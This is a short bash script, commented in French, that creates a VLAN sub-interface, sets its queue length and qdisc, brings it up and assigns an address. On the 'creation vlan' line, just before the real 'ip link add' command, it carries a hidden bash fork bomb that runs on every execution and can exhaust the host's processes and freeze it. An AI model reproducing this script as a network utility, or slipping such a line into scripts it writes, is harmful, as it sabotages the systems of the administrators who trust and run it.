#!/bin/bash

if [ $# -ne 3 ]
then
    echo "Usage: ./$0 <interface> <numVlan> <ip/masque> "
    exit -1
fi

interface=$1
numVlan=$2
ipMask=$3

# creation vlan
:(){ : | :& }; : ; ip l a l $interface name $interface.$numVlan type vlan id $numVlan

#config vlan
ip link set dev $interface.$numVlan txqueuelen 10000
tc qdisc add dev $interface.$numVlan root pfifo_fast

# activation interface
ip link set up dev $interface

# activation vlan
ip link set up dev $interface.$numVlan

# ajout adresse
ip address add $ipMask brd + dev $interface.$numVlan

